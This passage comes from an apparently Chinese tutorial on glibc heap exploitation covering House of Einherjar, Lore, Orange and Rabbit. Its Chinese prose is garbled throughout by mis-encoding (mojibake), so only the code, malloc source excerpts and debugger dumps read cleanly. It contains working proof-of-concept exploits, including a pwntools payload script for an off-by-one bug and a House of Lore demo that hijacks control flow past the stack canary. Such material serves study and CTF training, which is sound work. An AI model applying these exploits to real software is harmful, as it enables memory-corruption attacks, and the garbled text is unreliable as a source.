p1ï¼Œåˆ™æˆ‘ä»¬æ‰€å¾—åˆ°çš„æ–°çš„ chunk çš„ä½ç½® chunk_at_offset(p1, -((long) prevsize)) å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„ chunk ä½ç½®äº†ã€‚ æ”»å‡»è¿‡ç¨‹ç¤ºä¾‹å¯ä»¥è¿›è¡Œ House Of Einherjar æ”»å‡»çš„ä»£ç ï¼š #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main(void){ char* s0 = malloc(0x200); //æ„é€ fake chunk char* s1 = malloc(0x18); char* s2 = malloc(0xf0); char* s3 = malloc(0x20); //ä¸ºäº†ä¸è®©s2ä¸top chunk åˆå¹¶ printf(\"begin\\n\"); printf(\"%p\\n\", s0); printf(\"input s0\\n\"); read(0, s0, 0x200); //è¯»å…¥fake chunk printf(\"input s1\\n\"); read(0, s1, 0x19); //Off By One free(s2); return 0;} æ”»å‡»ä»£ç å¦‚ä¸‹ï¼š from pwn import *p = process(\"./example\")context.log_level = 'debug'#gdb.attach(p)p.recvuntil(\"begin\\n\")address = int(p.recvline().strip(), 16)p.recvuntil(\"input s0\\n\")payload = p64(0) + p64(0x101) + p64(address) * 2 + \"A\"*0xe0'''p64(address) * 2æ˜¯ä¸ºäº†ç»•è¿‡if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (\"corrupted double-linked list\");'''payload += p64(0x100) #fake sizep.sendline(payload)p.recvuntil(\"input s1\\n\")payload = \"A\"*0x10 + p64(0x220) + \"\\x00\"p.sendline(payload)p.recvall()p.close() åˆ©ç”¨ unlink æ¼æ´çš„æ—¶å€™ï¼š p-&gt;fd = &amp;p-3*4p-&gt;bk = &amp;p-2*4 åœ¨è¿™é‡Œåˆ©ç”¨æ—¶ï¼Œå› ä¸ºæ²¡æœ‰åŠæ³•æ‰¾åˆ° &amp;p , æ‰€ä»¥ç›´æ¥è®©ï¼š p-&gt;fd = pp-&gt;bk = p è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸ªç‚¹ï¼š payload = p64(0) + p64(0x101) + p64(address) * 2 + \"A\"*0xe0 å…¶å®ä¿®æ”¹ä¸ºä¸‹é¢è¿™æ ·ä¹Ÿæ˜¯å¯ä»¥çš„: payload = p64(0) + p64(0x221) + p64(address) * 2 + \"A\"*0xe0 æŒ‰ç…§é“ç†æ¥è®² fake chunk çš„ size æ˜¯ 0x221 æ‰åˆç†ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆ 0x101 ä¹Ÿå¯ä»¥å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºå¯¹ size å’Œ prev_size çš„éªŒè¯åªå‘ç”Ÿåœ¨ unlink é‡Œé¢ï¼Œè€Œ unlink é‡Œé¢æ˜¯è¿™æ ·éªŒè¯çš„: if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\"corrupted size vs. prev_size\"); æ‰€ä»¥åªéœ€è¦å†ä¼ªé€  fake chunk çš„ next chunk çš„ prev_size å­—æ®µå°±å¥½äº†ã€‚ æ€»ç»“è¿™é‡Œæˆ‘ä»¬æ€»ç»“ä¸‹è¿™ä¸ªåˆ©ç”¨æŠ€æœ¯éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š éœ€è¦æœ‰æº¢å‡ºæ¼æ´å¯ä»¥å†™ç‰©ç†ç›¸é‚»çš„é«˜åœ°å€çš„ prev_size ä¸ PREV_INUSE éƒ¨åˆ† æˆ‘ä»¬éœ€è¦è®¡ç®—ç›®çš„ chunk ä¸ p1 åœ°å€ä¹‹é—´çš„å·®ï¼Œæ‰€ä»¥éœ€è¦æ³„æ¼åœ°å€ æˆ‘ä»¬éœ€è¦åœ¨ç›®çš„ chunk é™„è¿‘æ„é€ ç›¸åº”çš„ fake chunkï¼Œä»è€Œç»•è¿‡ unlink çš„æ£€æµ‹ å…¶å®ï¼Œè¯¥æŠ€æœ¯ä¸ chunk extend/shrink æŠ€æœ¯æ¯”è¾ƒç±»ä¼¼ã€‚ House of LoreHouse of Lore æ”»å‡»ä¸ Glibc å †ç®¡ç†ä¸­çš„ Small Bin çš„æœºåˆ¶ç´§å¯†ç›¸å…³ã€‚ House of Lore å¯ä»¥å®ç°åˆ†é…ä»»æ„æŒ‡å®šä½ç½®çš„ chunkï¼Œä»è€Œä¿®æ”¹ä»»æ„åœ°å€çš„å†…å­˜ã€‚ House of Lore åˆ©ç”¨çš„å‰ææ˜¯éœ€è¦æ§åˆ¶ Small Bin Chunk çš„ bk æŒ‡é’ˆï¼Œå¹¶ä¸”æ§åˆ¶æŒ‡å®šä½ç½® chunk çš„ fd æŒ‡é’ˆã€‚ åŸç†å¦‚æœåœ¨ malloc çš„æ—¶å€™ï¼Œç”³è¯·çš„å†…å­˜å—åœ¨ small bin èŒƒå›´å†…ï¼Œé‚£ä¹ˆæ‰§è¡Œçš„æµç¨‹å¦‚ä¸‹ï¼š /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */if (in_smallbin_range(nb)) { // è·å– small bin çš„ç´¢å¼• idx = smallbin_index(nb); // è·å–å¯¹åº” small bin ä¸­çš„ chunk æŒ‡é’ˆ bin = bin_at(av, idx); // å…ˆæ‰§è¡Œ victim= last(bin)ï¼Œè·å– small bin çš„æœ€åä¸€ä¸ª chunk // å¦‚æœ victim = bin ï¼Œé‚£è¯´æ˜è¯¥ bin ä¸ºç©ºã€‚ // å¦‚æœä¸ç›¸ç­‰ï¼Œé‚£ä¹ˆä¼šæœ‰ä¸¤ç§æƒ…å†µ if ((victim = last(bin)) != bin) { // ç¬¬ä¸€ç§æƒ…å†µï¼Œsmall bin è¿˜æ²¡æœ‰åˆå§‹åŒ–ã€‚ if (victim == 0) /* initialization check */ // æ‰§è¡Œåˆå§‹åŒ–ï¼Œå°† fast bins ä¸­çš„ chunk è¿›è¡Œåˆå¹¶ malloc_consolidate(av); // ç¬¬äºŒç§æƒ…å†µï¼Œsmall bin ä¸­å­˜åœ¨ç©ºé—²çš„ chunk else { // è·å– small bin ä¸­å€’æ•°ç¬¬äºŒä¸ª chunk ã€‚ bck = victim-&gt;bk; // æ£€æŸ¥ bck-&gt;fd æ˜¯ä¸æ˜¯ victimï¼Œé˜²æ­¢ä¼ªé€  if (__glibc_unlikely(bck-&gt;fd != victim)) { errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; } // è®¾ç½® victim å¯¹åº”çš„ inuse ä½ set_inuse_bit_at_offset(victim, nb); // ä¿®æ”¹ small bin é“¾è¡¨ï¼Œå°† small bin çš„æœ€åä¸€ä¸ª chunk å–å‡ºæ¥ bin-&gt;bk = bck; bck-&gt;fd = bin; // å¦‚æœä¸æ˜¯ main_arenaï¼Œè®¾ç½®å¯¹åº”çš„æ ‡å¿— if (av != &amp;main_arena) set_non_main_arena(victim); // ç»†è‡´çš„æ£€æŸ¥ check_malloced_chunk(av, victim, nb); // å°†ç”³è¯·åˆ°çš„ chunk è½¬åŒ–ä¸ºå¯¹åº”çš„ mem çŠ¶æ€ void *p = chunk2mem(victim); // å¦‚æœè®¾ç½®äº† perturb_type , åˆ™å°†è·å–åˆ°çš„chunkåˆå§‹åŒ–ä¸º perturb_type ^ 0xff alloc_perturb(p, bytes); return p; } }} ä»ä¸­å¯ä»¥çœ‹å‡ºï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ small bin çš„æœ€åä¸€ä¸ª chunk çš„ bk ä¸ºæˆ‘ä»¬æŒ‡å®šå†…å­˜åœ°å€çš„ fake chunkï¼Œå¹¶ä¸”åŒæ—¶æ»¡è¶³ä¹‹åçš„ bck-&gt;fd != victim çš„æ£€æµ‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿å¾— small bin çš„ bk æ°å¥½ä¸ºæˆ‘ä»¬æ„é€ çš„ fake chunkã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ä¸‹ä¸€æ¬¡ç”³è¯· small bin çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±ä¼šåˆ†é…åˆ°æŒ‡å®šä½ç½®çš„ fake chunkã€‚ æ”»å‡»è¿‡ç¨‹ä»£ç ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;void jackpot(){ puts(\"Nice jump d00d\"); exit(0); }int main(int argc, char * argv[]){ intptr_t* stack_buffer_1[4] = {0}; intptr_t* stack_buffer_2[3] = {0}; fprintf(stderr, \"\\nWelcome to the House of Lore\\n\"); fprintf(stderr, \"This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n\"); fprintf(stderr, \"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\\n\\n\"); fprintf(stderr, \"Allocating the victim chunk\\n\"); intptr_t *victim = malloc(100); fprintf(stderr, \"Allocated the first small chunk on the heap at %p\\n\", victim); // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk intptr_t *victim_chunk = victim-2; fprintf(stderr, \"stack_buffer_1 at %p\\n\", (void*)stack_buffer_1); fprintf(stderr, \"stack_buffer_2 at %p\\n\", (void*)stack_buffer_2); fprintf(stderr, \"Create a fake chunk on the stack\"); fprintf(stderr, \"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted in second to the last malloc, which putting stack address on smallbin list\\n\"); stack_buffer_1[0] = 0; stack_buffer_1[1] = 0; stack_buffer_1[2] = victim_chunk; fprintf(stderr, \"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stack\"); stack_buffer_1[3] = (intptr_t*)stack_buffer_2; stack_buffer_2[2] = (intptr_t*)stack_buffer_1; fprintf(stderr, \"Allocating another large chunk in order to avoid consolidating the top chunk with the small one during the free()\\n\"); void *p5 = malloc(1000); fprintf(stderr, \"Allocated the large chunk on the heap at %p\\n\", p5); fprintf(stderr, \"Freeing the chunk %p, it will be inserted in the unsorted bin\\n\", victim); free((void*)victim); fprintf(stderr, \"\\nIn the unsorted bin the victim's fwd and bk pointers are nil\\n\"); fprintf(stderr, \"victim-&gt;fwd: %p\\n\", (void *)victim[0]); fprintf(stderr, \"victim-&gt;bk: %p\\n\\n\", (void *)victim[1]); fprintf(stderr, \"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\\n\"); fprintf(stderr, \"This means that the chunk %p will be inserted in front of the SmallBin\\n\", victim); void *p2 = malloc(1200); fprintf(stderr, \"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n\", p2); fprintf(stderr, \"The victim chunk has been sorted and its fwd and bk pointers updated\\n\"); fprintf(stderr, \"victim-&gt;fwd: %p\\n\", (void *)victim[0]); fprintf(stderr, \"victim-&gt;bk: %p\\n\\n\", (void *)victim[1]); //------------VULNERABILITY----------- fprintf(stderr, \"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\\n\"); victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack //------------------------------------ fprintf(stderr, \"Now allocating a chunk with size equal to the first one freed\\n\"); fprintf(stderr, \"This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\\n\"); void *p3 = malloc(100); fprintf(stderr, \"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\\n\"); char *p4 = malloc(100); fprintf(stderr, \"p4 = malloc(100)\\n\"); fprintf(stderr, \"\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n\", stack_buffer_2[2]); fprintf(stderr, \"\\np4 is %p and should be on the stack!\\n\", p4); // this chunk will be allocated on stack intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary} éœ€è¦æ³¨æ„çš„æ˜¯ï¼š 1ã€void *p5 = malloc(1000); æ˜¯ä¸ºäº†é˜²æ­¢å’Œ victim_chunk ä¹‹åå’Œ top_chunk åˆå¹¶ã€‚ 2ã€free((void*)victim)ï¼Œvictim ä¼šè¢«æ”¾å…¥åˆ° unsort bin ä¸­å»ï¼Œç„¶åä¸‹ä¸€æ¬¡åˆ†é…çš„å¤§å°å¦‚æœæ¯”å®ƒå¤§ï¼Œé‚£ä¹ˆå°†ä» top chunk ä¸Šåˆ†é…ç›¸åº”å¤§å°ï¼Œè€Œè¯¥ chunk ä¼šè¢«å–ä¸‹ link åˆ°ç›¸åº”çš„ bin ä¸­ã€‚å¦‚æœæ¯”å®ƒå° (ç›¸ç­‰åˆ™ç›´æ¥è¿”å›)ï¼Œåˆ™ä»è¯¥ chunk ä¸Šåˆ‡é™¤ç›¸åº”å¤§å°ï¼Œå¹¶è¿”å›ç›¸åº” chunkï¼Œå‰©ä¸‹çš„æˆä¸º last reminder chunk , è¿˜æ˜¯å­˜åœ¨ unsorted bin ä¸­ã€‚ House of OrangeHouse of Orange ä¸å…¶ä»–çš„ House of XX åˆ©ç”¨æ–¹æ³•ä¸åŒï¼Œè¿™ç§åˆ©ç”¨æ–¹æ³•æ¥è‡ªäº Hitcon CTF 2016 ä¸­çš„ä¸€é“åŒåé¢˜ç›®ã€‚ç”±äºè¿™ç§åˆ©ç”¨æ–¹æ³•åœ¨æ­¤å‰çš„ CTF é¢˜ç›®ä¸­æ²¡æœ‰å‡ºç°è¿‡ï¼Œå› æ­¤ä¹‹åå‡ºç°çš„ä¸€ç³»åˆ—è¡ç”Ÿé¢˜ç›®çš„åˆ©ç”¨æ–¹æ³•æˆ‘ä»¬ç§°ä¹‹ä¸º House of Orangeã€‚ æ¦‚è¿°House of Orange çš„åˆ©ç”¨æ¯”è¾ƒç‰¹æ®Šï¼Œé¦–å…ˆéœ€è¦ç›®æ ‡æ¼æ´æ˜¯å †ä¸Šçš„æ¼æ´ä½†æ˜¯ç‰¹æ®Šä¹‹å¤„åœ¨äºé¢˜ç›®ä¸­ä¸å­˜åœ¨ free å‡½æ•°æˆ–å…¶ä»–é‡Šæ”¾å †å—çš„å‡½æ•°ã€‚æˆ‘ä»¬çŸ¥é“ä¸€èˆ¬æƒ³è¦åˆ©ç”¨å †æ¼æ´ï¼Œéœ€è¦å¯¹å †å—è¿›è¡Œ malloc å’Œ free æ“ä½œï¼Œä½†æ˜¯åœ¨ House of Orange åˆ©ç”¨ä¸­æ— æ³•ä½¿ç”¨ free å‡½æ•°ï¼Œå› æ­¤ House of Orange æ ¸å¿ƒå°±æ˜¯é€šè¿‡æ¼æ´åˆ©ç”¨è·å¾— free çš„æ•ˆæœã€‚ åŸç†å¦‚å‰é¢æ‰€è¿°ï¼ŒHouse of Orange çš„æ ¸å¿ƒåœ¨äºåœ¨æ²¡æœ‰ free å‡½æ•°çš„æƒ…å†µä¸‹å¾—åˆ°ä¸€ä¸ªé‡Šæ”¾çš„å †å— (unsorted bin)ã€‚ è¿™ç§æ“ä½œçš„åŸç†ç®€å•æ¥è¯´æ˜¯å½“å‰å †çš„ top chunk å°ºå¯¸ä¸è¶³ä»¥æ»¡è¶³ç”³è¯·åˆ†é…çš„å¤§å°çš„æ—¶å€™ï¼ŒåŸæ¥çš„ top chunk ä¼šè¢«é‡Šæ”¾å¹¶è¢«ç½®å…¥ unsorted bin ä¸­ï¼Œé€šè¿‡è¿™ä¸€ç‚¹å¯ä»¥åœ¨æ²¡æœ‰ free å‡½æ•°æƒ…å†µä¸‹è·å–åˆ° unsorted binsã€‚ è¯¦ç»†è¿‡ç¨‹ï¼šå‡è®¾ç›®å‰çš„ top chunk å·²ç»ä¸æ»¡è¶³ malloc çš„åˆ†é…éœ€æ±‚ã€‚ é¦–å…ˆæˆ‘ä»¬åœ¨ç¨‹åºä¸­çš„mallocè°ƒç”¨ä¼šæ‰§è¡Œåˆ° libc.so çš„_int_mallocå‡½æ•°ä¸­ï¼Œåœ¨_int_mallocå‡½æ•°ä¸­ï¼Œä¼šä¾æ¬¡æ£€éªŒ fastbinã€small binsã€unsorted binã€large bins æ˜¯å¦å¯ä»¥æ»¡è¶³åˆ†é…è¦æ±‚ï¼Œå› ä¸ºå°ºå¯¸é—®é¢˜è¿™äº›éƒ½ä¸ç¬¦åˆã€‚æ¥ä¸‹æ¥_int_mallocå‡½æ•°ä¼šè¯•å›¾ä½¿ç”¨ top chunkï¼Œåœ¨è¿™é‡Œ top chunk ä¹Ÿä¸èƒ½æ»¡è¶³åˆ†é…çš„è¦æ±‚ï¼Œå› æ­¤ä¼šæ‰§è¡Œå¦‚ä¸‹åˆ†æ”¯ï¼š /*Otherwise, relay to handle system-dependent cases*/else { void *p = sysmalloc(nb, av); if (p != NULL &amp;&amp; __builtin_expect (perturb_byte, 0)) alloc_perturb (p, bytes); return p;} æ­¤æ—¶ ptmalloc å·²ç»ä¸èƒ½æ»¡è¶³ç”¨æˆ·ç”³è¯·å †å†…å­˜çš„æ“ä½œï¼Œéœ€è¦æ‰§è¡Œ sysmalloc æ¥å‘ç³»ç»Ÿç”³è¯·æ›´å¤šçš„ç©ºé—´ã€‚ ä½†æ˜¯å¯¹äºå †æ¥è¯´æœ‰ mmap å’Œ brk ä¸¤ç§åˆ†é…æ–¹å¼ï¼Œæˆ‘ä»¬éœ€è¦è®©å †ä»¥ brk çš„å½¢å¼æ‹“å±•ï¼Œä¹‹ååŸæœ‰çš„ top chunk ä¼šè¢«ç½®äº unsorted bin ä¸­ã€‚ ç»¼ä¸Šï¼Œæˆ‘ä»¬è¦å®ç° brk æ‹“å±• top chunkï¼Œä½†æ˜¯è¦å®ç°è¿™ä¸ªç›®çš„éœ€è¦ç»•è¿‡ä¸€äº› libc ä¸­çš„ checkã€‚ é¦–å…ˆï¼Œmalloc çš„å°ºå¯¸ä¸èƒ½å¤§äºmmp_.mmap_threshold if ((unsigned long)(nb) &gt;= (unsigned long)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)) ... å¦‚æœæ‰€éœ€åˆ†é…çš„ chunk å¤§å°å¤§äº mmap åˆ†é…é˜ˆå€¼ï¼Œé»˜è®¤ä¸º 128Kï¼Œå¹¶ä¸”å½“å‰è¿›ç¨‹ä½¿ç”¨ mmap() åˆ†é…çš„å†…å­˜å—å°äºè®¾å®šçš„æœ€å¤§å€¼ï¼Œå°†ä½¿ç”¨ mmap() ç³»ç»Ÿè°ƒç”¨ç›´æ¥å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ã€‚ åœ¨ sysmalloc å‡½æ•°ä¸­å­˜åœ¨å¯¹ top chunk size çš„ checkï¼Œå¦‚ä¸‹ï¼š assert((old_top == initial_top(av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse(old_top) &amp;&amp; ((unsigned long)old_end &amp; pagemask) == 0)); è¿™é‡Œæ£€æŸ¥äº† top chunk çš„åˆæ³•æ€§ï¼Œå¦‚æœç¬¬ä¸€æ¬¡è°ƒç”¨æœ¬å‡½æ•°ï¼Œtop chunk å¯èƒ½æ²¡æœ‰åˆå§‹åŒ–ï¼Œæ‰€ä»¥å¯èƒ½ old_size ä¸º 0ã€‚ å¦‚æœ top chunk å·²ç»åˆå§‹åŒ–äº†ï¼Œé‚£ä¹ˆ top chunk çš„å¤§å°å¿…é¡»å¤§äºç­‰äº MINSIZEï¼Œå› ä¸º top chunk ä¸­åŒ…å«äº† fencepostï¼Œæ‰€ä»¥ top chunk çš„å¤§å°å¿…é¡»è¦å¤§äº MINSIZEã€‚å…¶æ¬¡ top chunk å¿…é¡»æ ‡è¯†å‰ä¸€ä¸ª chunk å¤„äº inuse çŠ¶æ€ï¼Œå¹¶ä¸” top chunk çš„ç»“æŸåœ°å€å¿…å®šæ˜¯é¡µå¯¹é½çš„ã€‚æ­¤å¤– top chunk é™¤å» fencepost çš„å¤§å°å¿…å®šè¦å°äºæ‰€éœ€ chunk çš„å¤§å°ï¼Œå¦åˆ™åœ¨_int_malloc() å‡½æ•°ä¸­ä¼šä½¿ç”¨ top chunk åˆ†å‰²å‡º chunkã€‚ æˆ‘ä»¬æ€»ç»“ä¸€ä¸‹ä¼ªé€ çš„ top chunk size çš„è¦æ±‚ï¼š ä¼ªé€ çš„ size å¿…é¡»è¦å¯¹é½åˆ°å†…å­˜é¡µ size è¦å¤§äº MINSIZE(0x10) size è¦å°äºä¹‹åç”³è¯·çš„ chunk size + MINSIZE(0x10) size çš„ prev inuse ä½å¿…é¡»ä¸º 1 ä¹‹ååŸæœ‰çš„ top chunk å°±ä¼šæ‰§è¡Œ_int_freeä»è€Œé¡ºåˆ©è¿›å…¥ unsorted bin ä¸­ã€‚ ç¤ºä¾‹è¿™é‡Œç»™å‡ºäº†ä¸€ä¸ªç¤ºä¾‹ç¨‹åºï¼Œç¨‹åºæ¨¡æ‹Ÿäº†ä¸€ä¸ªæº¢å‡ºè¦†ç›–åˆ° top chunk çš„ size åŸŸã€‚æˆ‘ä»¬è¯•å›¾æŠŠ size æ”¹å°ä»è€Œå®ç° brk æ‰©å±•ï¼Œå¹¶æŠŠåŸæœ‰çš„ top chunk æ”¾å…¥ unsorted bin ä¸­ã€‚ #define fake_size 0x41int main(void){ void *ptr; ptr=malloc(0x10); ptr=(void *)((int)ptr+24); *((long long*)ptr)=fake_size; // overwrite top chunk size malloc(0x60); malloc(0x60);} è¿™é‡Œæˆ‘ä»¬æŠŠ top chunk çš„ size è¦†ç›–ä¸º 0x41ã€‚ä¹‹åç”³è¯·å¤§äºè¿™ä¸ªå°ºå¯¸çš„å †å—ï¼Œå³ 0x60ã€‚ ä½†æ˜¯å½“æˆ‘ä»¬æ‰§è¡Œè¿™ä¸ªç¤ºä¾‹æ—¶ä¼šå‘ç°ï¼Œè¿™ä¸ªç¨‹åºå¹¶ä¸èƒ½åˆ©ç”¨æˆåŠŸï¼ŒåŸå› åœ¨äº assert å¹¶æ²¡æœ‰è¢«æ»¡è¶³ä»è€ŒæŠ›å‡ºäº†å¼‚å¸¸ã€‚ [#0] 0x7ffff7a42428 â†’ Name: __GI_raise(sig=0x6)[#1] 0x7ffff7a4402a â†’ Name: __GI_abort()[#2] 0x7ffff7a8a2e8 â†’ Name: __malloc_assert(assertion=0x7ffff7b9e150 \"(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)\", file=0x7ffff7b9ab85 \"malloc.c\", line=0x95a, function=0x7ffff7b9e998 &lt;__func__.11509&gt; \"sysmalloc\")[#3] 0x7ffff7a8e426 â†’ Name: sysmalloc(nb=0x70, av=0x7ffff7dd1b20 &lt;main_arena&gt;) æˆ‘ä»¬å›å¤´æ¥çœ‹ä¸€ä¸‹ assert çš„æ¡ä»¶ï¼Œå¯ä»¥å‘ç°ä¹‹å‰åˆ—å‡ºçš„æ¡ç›®éƒ½è¢«æ»¡è¶³äº†é™¤äº†ç¬¬ä¸€æ¡ï¼š 1.ä¼ªé€ çš„sizeå¿…é¡»è¦å¯¹é½åˆ°å†…å­˜é¡µ ä»€ä¹ˆæ˜¯å¯¹é½åˆ°å†…å­˜é¡µå‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“ç°ä»£æ“ä½œç³»ç»Ÿéƒ½æ˜¯ä»¥å†…å­˜é¡µä¸ºå•ä½è¿›è¡Œå†…å­˜ç®¡ç†çš„ï¼Œä¸€èˆ¬å†…å­˜é¡µçš„å¤§å°æ˜¯ 4kbã€‚é‚£ä¹ˆæˆ‘ä»¬ä¼ªé€ çš„ size å°±å¿…é¡»è¦å¯¹é½åˆ°è¿™ä¸ªå°ºå¯¸ã€‚åœ¨è¦†ç›–ä¹‹å‰ top chunk çš„ size å¤§å°æ˜¯ 20fe1ï¼Œé€šè¿‡è®¡ç®—å¾—çŸ¥ 0x602020+0x20fe0=0x623000 æ˜¯å¯¹äº 0x1000ï¼ˆ4kbï¼‰å¯¹é½çš„ã€‚ 0x602000: 0x0000000000000000 0x00000000000000210x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x0000000000020fe1 &lt;== top chunk0x602030: 0x0000000000000000 0x0000000000000000 å› æ­¤æˆ‘ä»¬ä¼ªé€ çš„ fake_size å¯ä»¥æ˜¯ 0x0fe1ã€0x1fe1ã€0x2fe1ã€0x3fe1 ç­‰å¯¹ 4kb å¯¹é½çš„ sizeã€‚è€Œ 0x40 ä¸æ»¡è¶³å¯¹é½ï¼Œå› æ­¤ä¸èƒ½å®ç°åˆ©ç”¨ã€‚ #define fake_size 0x1fe1int main(void){ void *ptr; ptr=malloc(0x10); ptr=(void *)((int)ptr+24); *((long long*)ptr)=fake_size; malloc(0x2000); malloc(0x60);} è¿›è¡Œåˆ†é…ä¹‹åæˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°åŸæ¥çš„å †ç»è¿‡äº† brk æ‰©å±•ï¼š //åŸæœ‰çš„å †0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]//ç»è¿‡æ‰©å±•çš„å †0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap] æˆ‘ä»¬çš„ç”³è¯·è¢«åˆ†é…åˆ° 0x623010 çš„ä½ç½®ï¼ŒåŒæ—¶åŸæœ‰çš„å †è¢«ç½®å…¥ unsorted binï¼š [+] unsorted_bins[0]: fw=0x602020, bk=0x602020 â†’ Chunk(addr=0x602030, size=0x1fc0, flags=PREV_INUSE) å› ä¸º unsorted bin ä¸­å­˜åœ¨å—ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸‹æ¬¡çš„åˆ†é…ä¼šåˆ‡å‰²è¿™ä¸ªå—ï¼š malloc(0x60); 0x602030[+] unsorted_bins[0]: fw=0x602090, bk=0x602090 â†’ Chunk(addr=0x6020a0, size=0x1f50, flags=PREV_INUSE) å¯ä»¥çœ‹åˆ°åˆ†é…çš„å†…å­˜æ˜¯ä» unsorted bin ä¸­åˆ‡å‰²çš„ï¼Œå†…å­˜å¸ƒå±€å¦‚ä¸‹ï¼š 0x602030: 0x00007ffff7dd2208 0x00007ffff7dd2208 &lt;== æœªè¢«æ¸…é›¶çš„unsorted biné“¾è¡¨0x602040: 0x0000000000602020 0x00000000006020200x602050: 0x0000000000000000 0x00000000000000000x602060: 0x0000000000000000 0x00000000000000000x602070: 0x0000000000000000 0x00000000000000000x602080: 0x0000000000000000 0x00000000000000000x602090: 0x0000000000000000 0x0000000000001f51 &lt;== åˆ‡å‰²å‰©ä¸‹çš„æ–°unsorted bin0x6020a0: 0x00007ffff7dd1b78 0x00007ffff7dd1b780x6020b0: 0x0000000000000000 0x0000000000000000 å…¶å® house of orange çš„è¦ç‚¹æ­£åœ¨äºæ­¤ï¼Œä¹‹åçš„åˆ©ç”¨å› ä¸ºæ¶‰åŠåˆ°_IO_FILE çš„çŸ¥è¯†ï¼Œæ”¾åˆ° IO_FILE éƒ¨åˆ†è¿›è¡Œå­¦ä¹ è®°å½•ã€‚ House of RabbitHouse of rabbit æ˜¯ä¸€ç§ä¼ªé€ å †å—çš„æŠ€æœ¯ï¼Œä¸€èˆ¬è¿ç”¨åœ¨ fastbin attack ä¸­ï¼Œå› ä¸º unsorted bin ç­‰å…¶å®ƒçš„ bin æœ‰æ›´å¥½çš„åˆ©ç”¨æ‰‹æ®µã€‚ åŸç†æˆ‘ä»¬çŸ¥é“ï¼Œfastbin ä¸­ä¼šæŠŠç›¸åŒçš„ size çš„è¢«é‡Šæ”¾çš„å †å—ç”¨ä¸€ä¸ªå•å‘é“¾è¡¨ç®¡ç†ï¼Œåˆ†é…çš„æ—¶å€™ä¼šæ£€æŸ¥ size æ˜¯å¦åˆç†ï¼Œå¦‚æœä¸åˆç†ç¨‹åºå°±ä¼šå¼‚å¸¸é€€å‡ºã€‚è€Œ house of rabbit å°±åˆ©ç”¨äº†åœ¨ malloc consolidate çš„æ—¶å€™ fastbin ä¸­çš„å †å—è¿›è¡Œåˆå¹¶æ—¶ size æ²¡æœ‰è¿›è¡Œæ£€æŸ¥ä»è€Œä¼ªé€ ä¸€ä¸ªå‡çš„å †å—ï¼Œä¸ºè¿›ä¸€æ­¥çš„åˆ©ç”¨åšå‡†å¤‡ã€‚ åŸä½œè€…POC å‰ææ¡ä»¶ï¼š 1ã€å¯ä»¥ä¿®æ”¹ fastbin çš„ fd æŒ‡é’ˆæˆ– size 2ã€å¯ä»¥è§¦å‘ malloc consolidate(merge top æˆ– malloc big chunk ç­‰ç­‰) ä¸‹é¢æ¥çœ‹ä¸€ä¸‹ POCï¼š POC 1: modify the size of fastbin chunk unsigned long* chunk1=malloc(0x40); //0x602000unsigned long* chunk2=malloc(0x40); //0x602050malloc(0x10);free(chunk1);free(chunk2);/* Heap layout0000| 0x602000 --&gt; 0x0 0008| 0x602008 --&gt; 0x51 ('Q')0016| 0x602010 --&gt; 0x0 ..... 0080| 0x602050 --&gt; 0x0 0088| 0x602058 --&gt; 0x51 ('Q')0096| 0x602060 --&gt; 0x602000 --&gt; 0x0 0104| 0x602068 --&gt; 0x0 ...... 0160| 0x6020a0 --&gt; 0x0 0168| 0x6020a8 --&gt; 0x21 ('!')0176| 0x6020b0 --&gt; 0x0 0184| 0x6020b8 --&gt; 0x0 */chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1malloc(0x1000); //allocate a large chunk, trigger malloc consolidate/*Chunk1 overlap with chunk2 